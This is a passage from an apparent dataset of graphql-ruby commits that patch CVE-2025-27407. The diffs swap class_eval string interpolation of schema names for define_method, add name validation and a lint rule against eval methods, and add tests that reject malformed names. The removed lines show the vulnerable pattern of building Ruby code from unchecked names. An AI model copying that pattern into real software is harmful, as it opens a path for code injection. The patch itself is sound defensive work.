\"name\" => \"Query\",\n+              \"description\" => nil,\n+              \"fields\" => [\n+                {\n+                  \"name\" => \"int\",\n+                  \"description\" => nil,\n+                  \"type\" => {\n+                    \"kind\" => \"SCALAR\",\n+                    \"name\" => \"Int\",\n+                    \"ofType\" => nil,\n+                  },\n+                  \"args\" => [\n+                    {\n+                      \"name\" => \"inputObject\",\n+                      \"description\" => nil,\n+                      \"type\" => {\n+                        \"kind\" => \"INPUT_OBJECT\",\n+                        \"name\" => \"SomeInputObject\",\n+                        \"ofType\" => nil\n+                      },\n+                      \"defaultValue\" => nil\n+                    }\n+                  ],\n+                }\n+              ]\n+            },\n+            {\n+              \"kind\" => \"INPUT_OBJECT\",\n+              \"name\" => \"SomeInputObject\",\n+              \"description\" => nil,\n+              \"inputFields\" => [\n+                {\n+                  \"name\"=>\"bad, input\",\n+                  \"type\"=> { \"kind\" => \"SCALAR\", \"name\" => \"String\"},\n+                  \"defaultValue\"=> nil,\n+                  \"description\" => nil,\n+                },\n+              ]\n+            }\n+          ]\n+        }\n+      }\n+    }\n+    err = assert_raises GraphQL::InvalidNameError do\n+      GraphQL::Schema.from_introspection(json)\n+    end\n+\n+    assert_includes err.message, \"bad, input\"\n+  end\n end\n```",
                "url": "https://github.com/rmosolgo/graphql-ruby/commit/5c5a7b9a9bdce143be048074aea50edb7bb747be"
            },
            {
                "content": "Merge commit from fork\n\n[1.13] fix CVE 2025 27407\n\nFilename: .rubocop.yml:\n```\n@@ -1,5 +1,6 @@\nrequire:\n   - ./cop/development/none_without_block_cop\n+  - ./cop/development/no_eval_cop\n   - ./cop/development/no_focus_cop\n   - ./lib/graphql/rubocop/graphql/default_null_true\n   - ./lib/graphql/rubocop/graphql/default_required_true\n\n@@ -52,6 +53,10 @@\nDevelopment/NoneWithoutBlockCop:\n     - \"lib/**/*\"\n     - \"spec/**/*\"\n \n+Development/NoEvalCop:\n+  Include:\n+    - \"lib/**/*\"\n+\n Development/NoFocusCop:\n   Include:\n     - \"spec/**/*\"\n```\n\nFilename: benchmark/run.rb:\n```\n@@ -82,7 +82,7 @@\ndef self.profile_large_introspection\n             graphql_name(\"Object#{n}\")\n             20.times do |n2|\n               field :\"field#{n2}\", String do\n-                argument :arg, String\n+                argument :input, input_obj_t\n               end\n             end\n           end\n```\n\nFilename: cop/development/no_eval_cop.rb:\n```\n@@ -0,0 +1,18 @@\n+# frozen_string_literal: true\n+require 'rubocop'\n+\n+module Cop\n+  module Development\n+    class NoEvalCop < RuboCop::Cop::Base\n+      MSG_TEMPLATE = \"Don't use `%{eval_method_name}` which accepts strings and may result evaluating unexpected code. Use `%{exec_method_name}` instead, and pass a block.\"\n+\n+      def on_send(node)\n+        case node.method_name\n+        when :module_eval, :class_eval, :instance_eval\n+          message = MSG_TEMPLATE % { eval_method_name: node.method_name, exec_method_name: node.method_name.to_s.sub(\"eval\", \"exec\").to_sym }\n+          add_offense node, message: message\n+        end\n+      end\n+    end\n+  end\n+end\n```\n\nFilename: lib/graphql/language/nodes.rb:\n```\n@@ -133,6 +133,8 @@\ndef merge!(new_options)\n         end\n \n         class << self\n+          # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n           # Add a default `#visit_method` and `#children_method_name` using the class name\n           def inherited(child_class)\n             super\n\n@@ -276,6 +278,7 @@\ndef initialize_node #{arguments.join(\", \")}\n               RUBY\n             end\n           end\n+          # rubocop:enable Development/NoEvalCop\n         end\n       end\n```\n\nFilename: lib/graphql/schema/argument.rb:\n```\n@@ -52,6 +52,7 @@\ndef from_resolver?\n       def initialize(arg_name = nil, type_expr = nil, desc = nil, required: true, type: nil, name: nil, loads: nil, description: nil, ast_node: nil, default_value: NO_DEFAULT, as: nil, from_resolver: false, camelize: true, prepare: nil, method_access: true, owner:, validates: nil, directives: nil, deprecation_reason: nil, replace_null_with_default: false, &definition_block)\n         arg_name ||= name\n         @name = -(camelize ? Member::BuildType.camelize(arg_name.to_s) : arg_name.to_s)\n+        NameValidator.validate!(@name)\n         @type_expr = type_expr || type\n         @description = desc || description\n         @null = required != true\n\n@@ -85,11 +86,8 @@\ndef initialize(arg_name = nil, type_expr = nil, desc = nil, required: true, type\n         end\n \n         if definition_block\n-          if definition_block.arity == 1\n-            instance_exec(self, &definition_block)\n-          else\n-            instance_eval(&definition_block)\n-          end\n+          # `self` will still be self, it will also be the first argument to the block:\n+          instance_exec(self, &definition_block)\n         end\n       end\n```\n\nFilename: lib/graphql/schema/build_from_definition.rb:\n```\n@@ -427,17 +427,18 @@\ndef build_fields(owner, field_definitions, type_resolver, default_resolve:)\n \n             # Don't do this for interfaces\n             if default_resolve\n-              owner.class_eval <<-RUBY, __FILE__, __LINE__\n-                # frozen_string_literal: true\n-                def #{resolve_method_name}(**args)\n-                  field_instance = self.class.get_field(\"#{field_definition.name}\")\n-                  context.schema.definition_default_resolve.call(self.class, field_instance, object, args, context)\n-                end\n-              RUBY\n+              define_field_resolve_method(owner, resolve_method_name, field_definition.name)\n             end\n           end\n         end\n \n+        def define_field_resolve_method(owner, method_name, field_name)\n+          owner.define_method(method_name) { |**args|\n+            field_instance = self.class.get_field(field_name)\n+            context.schema.definition_default_resolve.call(self.class, field_instance, object, args, context)\n+          }\n+        end\n+\n         def build_resolve_type(lookup_hash, directives, missing_type_handler)\n           resolve_type_proc = nil\n           resolve_type_proc = ->(ast_node) {\n```\n\nFilename: lib/graphql/schema/enum_value.rb:\n```\n@@ -55,7 +55,7 @@\ndef initialize(graphql_name, desc = nil, owner:, ast_node: nil, directives: nil,\n         end\n \n         if block_given?\n-          instance_eval(&block)\n+          instance_exec(self, &block)\n         end\n       end\n```\n\nFilename: lib/graphql/schema/field.rb:\n```\n@@ -232,6 +232,7 @@\ndef initialize(type: nil, name: nil, owner: nil, null: true, field: nil, functio\n \n         @underscored_name = -Member::BuildType.underscore(name_s)\n         @name = -(camelize ? Member::BuildType.camelize(name_s) : name_s)\n+        NameValidator.validate!(@name)\n         @description = description\n         if field.is_a?(GraphQL::Schema::Field)\n           raise ArgumentError, \"Instead of passing a field as `field:`, use `add_field(field)` to add an already-defined field.\"\n```\n\nFilename: lib/graphql/schema/input_object.rb:\n```\n@@ -138,12 +138,7 @@\nclass << self\n         def argument(*args, **kwargs, &block)\n           argument_defn = super(*args, **kwargs, &block)\n           # Add a method access\n-          method_name = argument_defn.keyword\n-          class_eval <<-RUBY, __FILE__, __LINE__\n-            def #{method_name}\n-              self[#{method_name.inspect}]\n-            end\n-          RUBY\n+          define_accessor_method(argument_defn.keyword)\n           argument_defn\n         end\n\n@@ -253,6 +248,13 @@\ndef coerce_result(value, ctx)\n \n           result\n         end\n+\n+        private\n+\n+        def define_accessor_method(method_name)\n+          define_method(method_name) { self[method_name] }\n+          alias_method(method_name, method_name)\n+        end\n       end\n \n       private\n```\n\nFilename: lib/graphql/version.rb:\n```\n@@ -1,4 +1,4 @@\n# frozen_string_literal: true\n module GraphQL\n-  VERSION = \"1.13.23\"\n+  VERSION = \"1.13.24\"\n end\n```\n\nFilename: spec/graphql/schema/loader_spec.rb:\n```\n@@ -398,4 +398,153 @@\ndef assert_deep_equal(expected_type, actual_type)\n       assert_equal arg.default_value, { 'id' => nil, 'int' => nil, 'float' => nil, 'enum' => nil, 'sub' => nil, 'bool' => nil, 'bigint' => nil }\n     end\n   end\n+\n+  it \"validates field argument names\" do\n+    json = {\n+      \"data\" => {\n+        \"__schema\" => {\n+          \"queryType\" => {\n+            \"name\" => \"Query\"\n+          },\n+          \"mutationType\" => nil,\n+          \"subscriptionType\" => nil,\n+          \"types\" => [\n+            {\n+              \"kind\" => \"OBJECT\",\n+              \"name\" => \"Query\",\n+              \"description\" => nil,\n+              \"fields\" => [\n+                {\n+                  \"name\" => \"int\",\n+                  \"description\" => nil,\n+                  \"type\" => {\n+                    \"kind\" => \"SCALAR\",\n+                    \"name\" => \"Int\",\n+                    \"ofType\" => nil,\n+                  },\n+                  \"args\" => [\n+                    {\n+                      \"name\" => \"something-wrong\",\n+                      \"description\" => nil,\n+                      \"type\" => {\n+                        \"kind\" => \"SCALAR\",\n+                        \"name\" => \"Int\",\n+                        \"ofType\" => nil\n+                      },\n+                      \"defaultValue\" => nil\n+                    }\n+                  ],\n+                }\n+              ]\n+            }\n+          ]\n+        }\n+      }\n+    }\n+    err = assert_raises GraphQL::InvalidNameError do\n+      GraphQL::Schema.from_introspection(json)\n+    end\n+\n+    assert_includes err.message, \"something-wrong\"\n+  end\n+\n+  it \"validates field names\" do\n+    json = {\n+      \"data\" => {\n+        \"__schema\" => {\n+          \"queryType\" => {\n+            \"name\" => \"Query\"\n+          },\n+          \"mutationType\" => nil,\n+          \"subscriptionType\" => nil,\n+          \"types\" => [\n+            {\n+              \"kind\" => \"OBJECT\",\n+              \"name\" => \"Query\",\n+              \"description\" => nil,\n+              \"fields\" => [\n+                {\n+                  \"name\" => \"bad.int\",\n+                  \"description\" => nil,\n+                  \"type\" => {\n+                    \"kind\" => \"SCALAR\",\n+                    \"name\" => \"Int\",\n+                    \"ofType\" => nil,\n+                  },\n+                  \"args\" => [],\n+                }\n+              ]\n+            }\n+          ]\n+        }\n+      }\n+    }\n+    err = assert_raises GraphQL::InvalidNameError do\n+      GraphQL::Schema.from_introspection(json)\n+    end\n+\n+    assert_includes err.message, \"bad.int\"\n+  end\n+\n+  it \"validates input object argument names\" do\n+    json = {\n+      \"data\" => {\n+        \"__schema\" => {\n+          \"queryType\" => {\n+            \"name\" => \"Query\"\n+          },\n+          \"mutationType\" => nil,\n+          \"subscriptionType\" => nil,\n+          \"types\" => [\n+            {\n+              \"kind\" => \"OBJECT\",\n+              \"name\" => \"Query\",\n+              \"description\" => nil,\n+              \"fields\" => [\n+                {\n+                  \"name\" => \"int\",\n+                  \"description\" => nil,\n+                  \"type\" => {\n+                    \"kind\" => \"SCALAR\",\n+                    \"name\" => \"Int\",\n+                    \"ofType\" => nil,\n+                  },\n+                  \"args\" => [\n+                    {\n+                      \"name\" => \"inputObject\",\n+                      \"description\" => nil,\n+                      \"type\" => {\n+                        \"kind\" => \"INPUT_OBJECT\",\n+                        \"name\" => \"SomeInputObject\",\n+                        \"ofType\" => nil\n+                      },\n+                      \"defaultValue\" => nil\n+                    }\n+                  ],\n+                }\n+              ]\n+            },\n+            {\n+              \"kind\" => \"INPUT_OBJECT\",\n+              \"name\" => \"SomeInputObject\",\n+              \"description\" => nil,\n+              \"inputFields\" => [\n+                {\n+                  \"name\"=>\"bad, input\",\n+                  \"type\"=> { \"kind\" => \"SCALAR\", \"name\" => \"String\"},\n+                  \"defaultValue\"=> nil,\n+                  \"description\" => nil,\n+                },\n+              ]\n+            }\n+          ]\n+        }\n+      }\n+    }\n+    err = assert_raises GraphQL::InvalidNameError do\n+      GraphQL::Schema.from_introspection(json)\n+    end\n+\n+    assert_includes err.message, \"bad, input\"\n+  end\n end\n```",
                "url": "https://github.com/rmosolgo/graphql-ruby/commit/6eca16b9fa553aa957099a30dbde64ddcdac52ca"
            },
            {
                "content": "Merge commit from fork\n\n[2.0] fix CVE 2025 27407\n\nFilename: .rubocop.yml:\n```\n@@ -1,5 +1,6 @@\nrequire:\n   - ./cop/development/none_without_block_cop\n+  - ./cop/development/no_eval_cop\n   - ./cop/development/no_focus_cop\n   - ./lib/graphql/rubocop/graphql/default_null_true\n   - ./lib/graphql/rubocop/graphql/default_required_true\n\n@@ -52,6 +53,10 @@\nDevelopment/NoneWithoutBlockCop:\n     - \"lib/**/*\"\n     - \"spec/**/*\"\n \n+Development/NoEvalCop:\n+  Include:\n+    - \"lib/**/*\"\n+\n Development/NoFocusCop:\n   Include:\n     - \"spec/**/*\"\n```\n\nFilename: benchmark/run.rb:\n```\n@@ -111,12 +111,16 @@\ndef self.build_large_schema\n         end\n \n         obj_ts = 100.times.map do |n|\n+          input_obj_t = Class.new(GraphQL::Schema::InputObject) do\n+            graphql_name(\"Input#{n}\")\n+            argument :arg, String\n+          end\n           obj_t = Class.new(GraphQL::Schema::Object) do\n             graphql_name(\"Object#{n}\")\n             implements(*int_ts)\n             20.times do |n2|\n               field :\"field#{n2}\", String do\n-                argument :arg, String\n+                argument :input, input_obj_t\n               end\n \n             end\n\n@@ -153,8 +157,9 @@\ndef self.profile_boot\n     end\n     StackProf::Report.new(result).print_text\n \n+    retained_schema = nil\n     report = MemoryProfiler.report do\n-      build_large_schema\n+      retained_schema = build_large_schema\n     end\n \n     report.pretty_print\n```\n\nFilename: cop/development/no_eval_cop.rb:\n```\n@@ -0,0 +1,18 @@\n+# frozen_string_literal: true\n+require 'rubocop'\n+\n+module Cop\n+  module Development\n+    class NoEvalCop < RuboCop::Cop::Base\n+      MSG_TEMPLATE = \"Don't use `%{eval_method_name}` which accepts strings and may result evaluating unexpected code. Use `%{exec_method_name}` instead, and pass a block.\"\n+\n+      def on_send(node)\n+        case node.method_name\n+        when :module_eval, :class_eval, :instance_eval\n+          message = MSG_TEMPLATE % { eval_method_name: node.method_name, exec_method_name: node.method_name.to_s.sub(\"eval\", \"exec\").to_sym }\n+          add_offense node, message: message\n+        end\n+      end\n+    end\n+  end\n+end\n```\n\nFilename: lib/graphql/language/nodes.rb:\n```\n@@ -138,6 +138,8 @@\ndef merge!(new_options)\n         end\n \n         class << self\n+          # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n           # Add a default `#visit_method` and `#children_method_name` using the class name\n           def inherited(child_class)\n             super\n\n@@ -296,6 +298,7 @@\ndef self.from_a(filename, line, col, #{(scalar_method_names + @children_methods.\n               RUBY\n             end\n           end\n+          # rubocop:enable Development/NoEvalCop\n         end\n       end\n```\n\nFilename: lib/graphql/language/visitor.rb:\n```\n@@ -76,67 +76,6 @@\ndef visit\n         end\n       end\n \n-      # We don't use `alias` here because it breaks `super`\n-      def self.make_visit_methods(ast_node_class)\n-        node_method = ast_node_class.visit_method\n-        children_of_type = ast_node_class.children_of_type\n-        child_visit_method = :\"#{node_method}_children\"\n-\n-        class_eval(<<-RUBY, __FILE__, __LINE__ + 1)\n-          # The default implementation for visiting an AST node.\n-          # It doesn't _do_ anything, but it continues to visiting the node's children.\n-          # To customize this hook, override one of its make_visit_methods (or the base method?)\n-          # in your subclasses.\n-          #\n-          # For compatibility, it calls hook procs, too.\n-          # @param node [GraphQL::Language::Nodes::AbstractNode] the node being visited\n-          # @param parent [GraphQL::Language::Nodes::AbstractNode, nil] the previously-visited node, or `nil` if this is the root node.\n-          # @return [Array, nil] If there were modifications, it returns an array of new nodes, otherwise, it returns `nil`.\n-          def #{node_method}(node, parent)\n-            if node.equal?(DELETE_NODE)\n-              # This might be passed to `super(DELETE_NODE, ...)`\n-              # by a user hook, don't want to keep visiting in that case.\n-              [node, parent]\n-            else\n-              # Run hooks if there are any\n-              new_node = node\n-              no_hooks = !@visitors.key?(node.class)\n-              if no_hooks || begin_visit(new_node, parent)\n-                #{\n-                  if method_defined?(child_visit_method)\n-                    \"new_node = #{child_visit_method}(new_node)\"\n-                  elsif children_of_type\n-                    children_of_type.map do |child_accessor, child_class|\n-                      \"node.#{child_accessor}.each do |child_node|\n-                        new_child_and_node = #{child_class.visit_method}_with_modifications(child_node, new_node)\n-                        # Reassign `node` in case the child hook makes a modification\n-                        if new_child_and_node.is_a?(Array)\n-                          new_node = new_child_and_node[1]\n-                        end\n-                      end\"\n-                    end.join(\"\\n\")\n-                  else\n-                    \"\"\n-                  end\n-                }\n-              end\n-              end_visit(new_node, parent) unless no_hooks\n-\n-              if new_node.equal?(node)\n-                [node, parent]\n-              else\n-                [new_node, parent]\n-              end\n-            end\n-          end\n-\n-          def #{node_method}_with_modifications(node, parent)\n-            new_node_and_new_parent = #{node_method}(node, parent)\n-            apply_modifications(node, parent, new_node_and_new_parent)\n-          end\n-        RUBY\n-      end\n-\n       def on_document_children(document_node)\n         new_node = document_node\n         document_node.children.each do |child_node|\n\n@@ -237,6 +176,68 @@\ndef on_argument_children(new_node)\n         new_node\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n+      def self.make_visit_methods(ast_node_class)\n+        node_method = ast_node_class.visit_method\n+        children_of_type = ast_node_class.children_of_type\n+        child_visit_method = :\"#{node_method}_children\"\n+\n+        class_eval(<<-RUBY, __FILE__, __LINE__ + 1)\n+          # The default implementation for visiting an AST node.\n+          # It doesn't _do_ anything, but it continues to visiting the node's children.\n+          # To customize this hook, override one of its make_visit_methods (or the base method?)\n+          # in your subclasses.\n+          #\n+          # For compatibility, it calls hook procs, too.\n+          # @param node [GraphQL::Language::Nodes::AbstractNode] the node being visited\n+          # @param parent [GraphQL::Language::Nodes::AbstractNode, nil] the previously-visited node, or `nil` if this is the root node.\n+          # @return [Array, nil] If there were modifications, it returns an array of new nodes, otherwise, it returns `nil`.\n+          def #{node_method}(node, parent)\n+            if node.equal?(DELETE_NODE)\n+              # This might be passed to `super(DELETE_NODE, ...)`\n+              # by a user hook, don't want to keep visiting in that case.\n+              [node, parent]\n+            else\n+              # Run hooks if there are any\n+              new_node = node\n+              no_hooks = !@visitors.key?(node.class)\n+              if no_hooks || begin_visit(new_node, parent)\n+                #{\n+                  if method_defined?(child_visit_method)\n+                    \"new_node = #{child_visit_method}(new_node)\"\n+                  elsif children_of_type\n+                    children_of_type.map do |child_accessor, child_class|\n+                      \"node.#{child_accessor}.each do |child_node|\n+                        new_child_and_node = #{child_class.visit_method}_with_modifications(child_node, new_node)\n+                        # Reassign `node` in case the child hook makes a modification\n+                        if new_child_and_node.is_a?(Array)\n+                          new_node = new_child_and_node[1]\n+                        end\n+                      end\"\n+                    end.join(\"\\n\")\n+                  else\n+                    \"\"\n+                  end\n+                }\n+              end\n+              end_visit(new_node, parent) unless no_hooks\n+              if new_node.equal?(node)\n+                [node, parent]\n+              else\n+                [new_node, parent]\n+              end\n+            end\n+          end\n+          def #{node_method}_with_modifications(node, parent)\n+            new_node_and_new_parent = #{node_method}(node, parent)\n+            apply_modifications(node, parent, new_node_and_new_parent)\n+          end\n+        RUBY\n+      end\n+\n+\n+\n       [\n         Language::Nodes::Argument,\n         Language::Nodes::Directive,\n\n@@ -277,6 +278,8 @@\ndef on_argument_children(new_node)\n         make_visit_methods(ast_node_class)\n       end\n \n+      # rubocop:enable Development/NoEvalCop\n+\n       private\n \n       def apply_modifications(node, parent, new_node_and_new_parent)\n```\n\nFilename: lib/graphql/schema/argument.rb:\n```\n@@ -53,6 +53,7 @@\ndef from_resolver?\n       def initialize(arg_name = nil, type_expr = nil, desc = nil, required: true, type: nil, name: nil, loads: nil, description: nil, ast_node: nil, default_value: NOT_CONFIGURED, as: nil, from_resolver: false, camelize: true, prepare: nil, owner:, validates: nil, directives: nil, deprecation_reason: nil, replace_null_with_default: false, &definition_block)\n         arg_name ||= name\n         @name = -(camelize ? Member::BuildType.camelize(arg_name.to_s) : arg_name.to_s)\n+        NameValidator.validate!(@name)\n         @type_expr = type_expr || type\n         @description = desc || description\n         @null = required != true\n\n@@ -88,11 +89,8 @@\ndef initialize(arg_name = nil, type_expr = nil, desc = nil, required: true, type\n         end\n \n         if definition_block\n-          if definition_block.arity == 1\n-            instance_exec(self, &definition_block)\n-          else\n-            instance_eval(&definition_block)\n-          end\n+          # `self` will still be self, it will also be the first argument to the block:\n+          instance_exec(self, &definition_block)\n         end\n       end\n```\n\nFilename: lib/graphql/schema/build_from_definition.rb:\n```\n@@ -453,17 +453,18 @@\ndef build_fields(owner, field_definitions, type_resolver, default_resolve:)\n \n             # Don't do this for interfaces\n             if default_resolve\n-              owner.class_eval <<-RUBY, __FILE__, __LINE__\n-                # frozen_string_literal: true\n-                def #{resolve_method_name}(**args)\n-                  field_instance = self.class.get_field(\"#{field_definition.name}\")\n-                  context.schema.definition_default_resolve.call(self.class, field_instance, object, args, context)\n-                end\n-              RUBY\n+              define_field_resolve_method(owner, resolve_method_name, field_definition.name)\n             end\n           end\n         end\n \n+        def define_field_resolve_method(owner, method_name, field_name)\n+          owner.define_method(method_name) { |**args|\n+            field_instance = self.class.get_field(field_name)\n+            context.schema.definition_default_resolve.call(self.class, field_instance, object, args, context)\n+          }\n+        end\n+\n         def build_resolve_type(lookup_hash, directives, missing_type_handler)\n           resolve_type_proc = nil\n           resolve_type_proc = ->(ast_node) {\n```\n\nFilename: lib/graphql/schema/directive.rb:\n```\n@@ -99,7 +99,7 @@\ndef repeatable(new_value)\n \n         def inherited(subclass)\n           super\n-          subclass.class_eval do\n+          subclass.class_exec do\n             @default_graphql_name ||= nil\n           end\n         end\n```\n\nFilename: lib/graphql/schema/enum_value.rb:\n```\n@@ -47,7 +47,7 @@\ndef initialize(graphql_name, desc = nil, owner:, ast_node: nil, directives: nil,\n         end\n \n         if block_given?\n-          instance_eval(&block)\n+          instance_exec(self, &block)\n         end\n       end\n```\n\nFilename: lib/graphql/schema/field.rb:\n```\n@@ -233,7 +233,7 @@\ndef initialize(type: nil, name: nil, owner: nil, null: nil, description: NOT_CON\n \n         @underscored_name = -Member::BuildType.underscore(name_s)\n         @name = -(camelize ? Member::BuildType.camelize(name_s) : name_s)\n-\n+        NameValidator.validate!(@name)\n         @description = description\n         @type = @owner_type = @own_validators = @own_directives = @own_arguments = @arguments_statically_coercible = nil # these will be prepared later if necessary\n```\n\nFilename: lib/graphql/schema/input_object.rb:\n```\n@@ -131,12 +131,7 @@\ndef argument(*args, **kwargs, &block)\n             end\n           end\n           # Add a method access\n-          method_name = argument_defn.keyword\n-          class_eval <<-RUBY, __FILE__, __LINE__\n-            def #{method_name}\n-              self[#{method_name.inspect}]\n-            end\n-          RUBY\n+          define_accessor_method(argument_defn.keyword)\n           argument_defn\n         end\n\n@@ -242,6 +237,13 @@\ndef coerce_result(value, ctx)\n \n           result\n         end\n+\n+        private\n+\n+        def define_accessor_method(method_name)\n+          define_method(method_name) { self[method_name] }\n+          alias_method(method_name, method_name)\n+        end\n       end\n \n       private\n```\n\nFilename: lib/graphql/schema/member/has_directives.rb:\n```\n@@ -6,7 +6,7 @@\nclass Member\n       module HasDirectives\n         def self.extended(child_cls)\n           super\n-          child_cls.module_eval { self.own_directives = nil }\n+          child_cls.module_exec { self.own_directives = nil }\n         end\n \n         def inherited(child_cls)\n```\n\nFilename: lib/graphql/schema/member/has_fields.rb:\n```\n@@ -180,7 +180,7 @@\ndef self.extended(child_class)\n \n         def inherited(subclass)\n           super\n-          subclass.class_eval do\n+          subclass.class_exec do\n             @own_fields ||= nil\n             @field_class ||= nil\n           end\n```\n\nFilename: lib/graphql/schema/member/has_interfaces.rb:\n```\n@@ -119,7 +119,7 @@\ndef self.extended(child_class)\n \n         def inherited(subclass)\n           super\n-          subclass.class_eval do\n+          subclass.class_exec do\n             @own_interface_type_memberships ||= nil\n           end\n         end\n```\n\nFilename: lib/graphql/schema/member/type_system_helpers.rb:\n```\n@@ -43,7 +43,7 @@\ndef kind\n         private\n \n         def inherited(subclass)\n-          subclass.class_eval do\n+          subclass.class_exec do\n             @to_non_null_type ||= nil\n             @to_list_type ||= nil\n           end\n```\n\nFilename: lib/graphql/tracing/appoptics_trace.rb:\n```\n@@ -28,6 +28,8 @@\ndef self.version\n         Gem::Version.new('1.0.0')\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n       [\n         'lex',\n         'parse',\n\n@@ -55,6 +57,8 @@\ndef #{trace_method}(**data)\n         RUBY\n       end\n \n+      # rubocop:enable Development/NoEvalCop\n+\n       def execute_field(query:, field:, ast_node:, arguments:, object:)\n         return_type = field.type.unwrap\n         trace_field = if return_type.kind.scalar? || return_type.kind.enum?\n```\n\nFilename: lib/graphql/tracing/appsignal_trace.rb:\n```\n@@ -13,6 +13,8 @@\ndef initialize(set_action_name: false, **rest)\n         super\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n       {\n         \"lex\" => \"lex.graphql\",\n         \"parse\" => \"parse.graphql\",\n\n@@ -43,6 +45,8 @@\ndef #{trace_method}(**data)\n         RUBY\n       end\n \n+      # rubocop:enable Development/NoEvalCop\n+\n       def platform_execute_field(platform_key)\n         Appsignal.instrument(platform_key) do\n           yield\n```\n\nFilename: lib/graphql/tracing/data_dog_trace.rb:\n```\n@@ -20,6 +20,8 @@\ndef initialize(tracer: nil, analytics_enabled: false, analytics_sample_rate: 1.0\n         super\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n       {\n         'lex' => 'lex.graphql',\n         'parse' => 'parse.graphql',\n\n@@ -69,6 +71,8 @@\ndef #{trace_method}(**data)\n         RUBY\n       end\n \n+      # rubocop:enable Development/NoEvalCop\n+\n       def execute_field_span(span_key, query, field, ast_node, arguments, object)\n         return_type = field.type.unwrap\n         trace_field = if return_type.kind.scalar? || return_type.kind.enum?\n```\n\nFilename: lib/graphql/tracing/notifications_trace.rb:\n```\n@@ -16,6 +16,8 @@\ndef initialize(engine:, **rest)\n         super\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n       {\n         \"lex\" => \"lex.graphql\",\n         \"parse\" => \"parse.graphql\",\n\n@@ -39,6 +41,8 @@\ndef #{trace_method}(**metadata, &blk)\n         RUBY\n       end\n \n+      # rubocop:enable Development/NoEvalCop\n+\n       include PlatformTrace\n     end\n   end\n```\n\nFilename: lib/graphql/tracing/platform_trace.rb:\n```\n@@ -39,6 +39,9 @@\ndef self.included(child_class)\n           include(BaseKeyCache)\n         }\n         child_class.const_set(:KeyCache, key_methods_class)\n+\n+        # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n         [:execute_field, :execute_field_lazy].each do |field_trace_method|\n           if !child_class.method_defined?(field_trace_method)\n             child_class.module_eval <<-RUBY, __FILE__, __LINE__\n\n@@ -91,6 +94,8 @@\ndef #{rt_trace_method}(query:, type:, object:)\n               end\n             RUBY\n           end\n+\n+          # rubocop:enable Development/NoEvalCop\n         end\n       end\n```\n\nFilename: lib/graphql/tracing/prometheus_trace.rb:\n```\n@@ -13,6 +13,8 @@\ndef initialize(client: PrometheusExporter::Client.default, keys_whitelist: [\"exe\n         super(**rest)\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n       {\n         'lex' => \"graphql.lex\",\n         'parse' => \"graphql.parse\",\n\n@@ -30,6 +32,8 @@\ndef #{trace_method}(**data, &block)\n         RUBY\n       end\n \n+      # rubocop:enable Development/NoEvalCop\n+\n       def platform_execute_field(platform_key, &block)\n         instrument_execution(platform_key, \"execute_field\", &block)\n       end\n```\n\nFilename: lib/graphql/tracing/scout_trace.rb:\n```\n@@ -16,6 +16,8 @@\ndef initialize(set_transaction_name: false, **_rest)\n         super\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n       {\n         \"lex\" => \"lex.graphql\",\n         \"parse\" => \"parse.graphql\",\n\n@@ -45,6 +47,7 @@\ndef #{trace_method}(**data)\n         end\n         RUBY\n       end\n+      # rubocop:enable Development/NoEvalCop\n \n       def platform_execute_field(platform_key, &block)\n         self.class.instrument(\"GraphQL\", platform_key, INSTRUMENT_OPTS, &block)\n```\n\nFilename: lib/graphql/tracing/statsd_trace.rb:\n```\n@@ -11,6 +11,8 @@\ndef initialize(statsd:, **rest)\n         super(**rest)\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n       {\n         'lex' => \"graphql.lex\",\n         'parse' => \"graphql.parse\",\n\n@@ -30,6 +32,8 @@\ndef #{trace_method}(**data)\n         RUBY\n       end\n \n+      # rubocop:enable Development/NoEvalCop\n+\n       def platform_execute_field(platform_key, &block)\n         @statsd.time(platform_key, &block)\n       end\n```\n\nFilename: lib/graphql/types/relay/connection_behaviors.rb:\n```\n@@ -13,7 +13,7 @@\ndef self.included(child_class)\n           child_class.node_nullable(true)\n           child_class.edges_nullable(true)\n           child_class.edge_nullable(true)\n-          child_class.module_eval {\n+          child_class.module_exec {\n             self.edge_type = nil\n             self.node_type = nil\n             self.edge_class = nil\n```\n\nFilename: lib/graphql/types/relay/edge_behaviors.rb:\n```\n@@ -8,7 +8,7 @@\ndef self.included(child_class)\n           child_class.description(\"An edge in a connection.\")\n           child_class.field(:cursor, String, null: false, description: \"A cursor for use in pagination.\")\n           child_class.extend(ClassMethods)\n-          child_class.class_eval { self.node_type = nil }\n+          child_class.class_exec { self.node_type = nil }\n           child_class.node_nullable(true)\n         end\n```\n\nFilename: lib/graphql/version.rb:\n```\n@@ -1,4 +1,4 @@\n# frozen_string_literal: true\n module GraphQL\n-  VERSION = \"2.0.31\"\n+  VERSION = \"2.0.32\"\n end\n```\n\nFilename: spec/graphql/schema/loader_spec.rb:\n```\n@@ -398,4 +398,153 @@\ndef assert_deep_equal(expected_type, actual_type)\n       assert_equal arg.default_value, { 'id' => nil, 'int' => nil, 'float' => nil, 'enum' => nil, 'sub' => nil, 'bool' => nil, 'bigint' => nil }\n     end\n   end\n+\n+  it \"validates field argument names\" do\n+    json = {\n+      \"data\" => {\n+        \"__schema\" => {\n+          \"queryType\" => {\n+            \"name\" => \"Query\"\n+          },\n+          \"mutationType\" => nil,\n+          \"subscriptionType\" => nil,\n+          \"types\" => [\n+            {\n+              \"kind\" => \"OBJECT\",\n+              \"name\" => \"Query\",\n+              \"description\" => nil,\n+              \"fields\" => [\n+                {\n+                  \"name\" => \"int\",\n+                  \"description\" => nil,\n+                  \"type\" => {\n+                    \"kind\" => \"SCALAR\",\n+                    \"name\" => \"Int\",\n+                    \"ofType\" => nil,\n+                  },\n+                  \"args\" => [\n+                    {\n+                      \"name\" => \"something-wrong\",\n+                      \"description\" => nil,\n+                      \"type\" => {\n+                        \"kind\" => \"SCALAR\",\n+                        \"name\" => \"Int\",\n+                 